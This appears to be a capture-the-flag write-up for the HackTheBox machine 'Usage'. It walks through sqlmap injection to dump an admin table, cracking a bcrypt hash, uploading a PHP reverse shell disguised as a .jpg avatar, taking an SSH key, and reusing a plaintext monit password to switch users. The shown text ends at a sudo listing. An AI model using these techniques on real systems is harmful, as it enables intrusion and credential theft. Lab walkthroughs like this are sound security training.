@@ -1,0 +1,312 @@
+--------------------------------------------
+
+Machine:            Usage - HackTheBox
+Difficulty:         Easy
+Machine Address:    10.10.11.18 - usage.htb
+VPN Address:        10.10.14.15 - tun0
+
+--------------------------------------------
+
+First of all, I put the ip address of the machine in the /etc/hosts file with vim :
+
+$ sudo vim /etc/hosts
+
+I started by doing a nmap scan on the machine :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
+└──╼ [★]$ cat nmap_scan 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-30 18:38 CEST
+Nmap scan report for usage.htb (10.10.11.18)
+Host is up (0.020s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds
+
+So let's explore the webapp running on the port 80.
+
+We can see that there is a form which may be vulnerable to sql injection since it is a login form.
+
+After testing a bunch of sqli payloads, I came across with absolutely nothing for the "main" page.
+
+But as you can see in the image bellow, there is a little button which redirect us to another page with a form. A form which also may be vulnerable. Let's test this.
+
+<insert web1 image>
+
+I tested a lot of payloads, and none of them worked. Hence, I decided to use sqlmap as it will test way more payloads than me.
+So I saved the request from burpsuite in a file named 'request' and I used sqlmap :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
+└──╼ [★]$ sqlmap -r request -p 'email' --dbms=mysql --level=5 --risk=3 --technique=BUT --batch --dbs
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.7.2#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:14:24 /2024-05-01/
+
+[12:14:24] [INFO] parsing HTTP request from 'request'
+
+[...SNIP...]
+
+[12:16:31] [INFO] fetching database names
+[12:16:31] [INFO] fetching number of databases
+[12:16:31] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[12:16:31] [INFO] retrieved: 3
+[12:16:32] [INFO] retrieved: information_schema
+[12:16:52] [INFO] retrieved: performance_schema
+[12:17:10] [INFO] retrieved: usage_blog
+available databases [3]:
+
+[*] information_schema
+[*] performance_schema
+[*] usage_blog
+
+
+
+Nice ! We now have a suspicious database named "usage_blog". Let's display the tables inside this db.
+
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
+└──╼ [★]$ sqlmap -r request -p 'email' --dbms=mysql --level=5 --risk=3 --technique=BUT --batch -D usage_blog --tables
+
+[...SNIP...]
+
+[12:26:51] [INFO] retrieved: users
+Database: usage_blog
+[15 tables]
++------------------------+
+| admin_menu             |
+| admin_operation_log    |
+| admin_permissions      |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_role_users       |
+| admin_roles            |
+| admin_user_permissions |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| personal_access_tokens |
+| users                  |
++------------------------+
+
+Now we have this list of tables, we have to search for the most interesting one. "admin_users" table seems interesting :) Let's dump it :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
+└──╼ [★]$ sqlmap -r request -p 'email' --dbms=mysql --level=5 --risk=3 --technique=BUT --batch -D usage_blog -T admin_users --dump
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.7.2#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:47:25 /2024-05-01/
+
+[...SNIP...]
+
+Database: usage_blog
+Table: admin_users
+[1 entry]
++----+---------------+--------------------------------------------------------------+----------+---------------------+--------------------------------------------------------------+
+| id | name          | password                                                     | username | updated_at          | remember_token                                               |
++----+---------------+--------------------------------------------------------------+----------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2024-05-01 10:51:13 | ryBf8NqUZAwKzYIIibNHXxtw76jy0p7yr04PEEHtl`a1E8Ldde62oEp9ILaD |
++----+---------------+--------------------------------------------------------------+----------+---------------------+--------------------------------------------------------------+
+
+[*] ending @ 12:51:40 /2024-05-01/
+
+
+Okay so what do we have ? We have a password hash and a token. Let's try to bruteforce the hash with john.
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
+└──╼ [★]$ echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' > tojhon
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
+└──╼ [★]$ john tojhon --wordlist=/security/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+whatever1        (?)     
+1g 0:00:00:03 DONE (2024-05-01 12:57) 0.3095g/s 534.9p/s 534.9c/s 534.9C/s alexis1..argentina
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+Nice ! we found the password of the admin account !
+
+admin:whatever1
+
+
+Since we have admin account credentials, we should try to connect to the admin panel located at the url admin.usage.htb :
+
+<insert image panel2>
+
+<insert image panel3>
+
+Here we are ! Now, we need to identify the elements that may permits us to get a shell access to the machine.
+One particular thing seems interesting : the possibility to upload an avatar for the admin account. There maybe is a file upload flaw.
+Let's test that.
+
+<insert image panel4>
+
+After plenty of tries to upload malicious files, I come up with a good idea : try to upload a php reverse shell file with the '.jpg' extension to bypass the restrictions.
+Then I intercepted the POST request with burpsuite :
+
+<insert image burp5>
+
+I started a netcat listener on my port 4444 and I submitted the request :
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
+└──╼ [★]$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.18] 42914
+Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 13:43:42 up 12 min,  0 users,  load average: 0.00, 0.03, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1000(dash) gid=1000(dash) groups=1000(dash)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+dash@usage:/$ 
+
+
+And I successfully got a reverse shell ! Then I upgraded to tty interactive shell.
+
+
+Now I can display the user flag :
+
+dash@usage:/$ cd home
+dash@usage:/home$ ls
+dash  xander
+dash@usage:/home$ cd dash
+cd dash
+dash@usage:~$ ls 
+user.txt
+dash@usage:~$ cat user.txt
+REDACTED
+dash@usage:~$
+
+Now that we are logged as 'dash', we can see that he has a .ssh folder which contain an id_rsa private key. I downloaded this private key to use a more reliable way to log onto the machine.
+
+
+┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
+└──╼ [★]$ ssh dash@usage.htb -i id_rsa 
+
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Mon May 13 01:50:50 PM UTC 2024
+
+  System load:           0.103515625
+  Usage of /:            64.8% of 6.53GB
+  Memory usage:          20%
+  Swap usage:            0%
+  Processes:             229
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.18
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:b1c
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Apr  8 12:35:43 2024 from 10.10.14.40
+dash@usage:~$ 
+
+
+Now what's next ? Well, we should start by enumerating the /home/dash folder.
+
+dash@usage:~$ ls -la
+total 52
+drwxr-x--- 6 dash dash 4096 May 13 14:02 .
+drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
+-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
+-rw-r--r-- 1 dash dash    5 May 13 14:02 .monit.pid
+-rw------- 1 dash dash 1192 May 13 14:02 .monit.state
+-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
+-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
+drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
+-rw-r----- 1 root dash   33 May 13 13:31 user.txt
+dash@usage:~$ 
+
+The file '.monitrc' seems weird. We should obviously display its content :
+
+dash@usage:~$ cat .monitrc 
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+
+#Apache
+check process apache with pidfile "/var/run/apache2/apache2.pid"
+    if cpu > 80% for 2 cycles then alert
+
+
+#System Monitoring 
+check system usage
+    if memory usage > 80% for 2 cycles then alert
+    if cpu usage (user) > 70% for 2 cycles then alert
+        if cpu usage (system) > 30% then alert
+    if cpu usage (wait) > 20% then alert
+    if loadavg (1min) > 6 for 2 cycles then alert 
+    if loadavg (5min) > 4 for 2 cycles then alert
+    if swap usage > 5% then alert
+
+check filesystem rootfs with path /
+       if space usage > 80% then alert
+dash@usage:~$ 
+
+Mama ! We can see here a password : 3nc0d3d_pa$$w0rd
+
+We know that there are two differents users on the machine : dash & xander.
+Then let's try to log as xander with this password :
+
+dash@usage:~$ su xander
+Password: 
+xander@usage:/home/dash$ 
+
+And it worked ! Lol. So we have xander:3nc0d3d_pa$$w0rd.
+
+By checking xander's sudo permissions, we can observe that he have all rights to execute a binary :
+
+xander@usage:~$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+xander@usage:~$ 
+
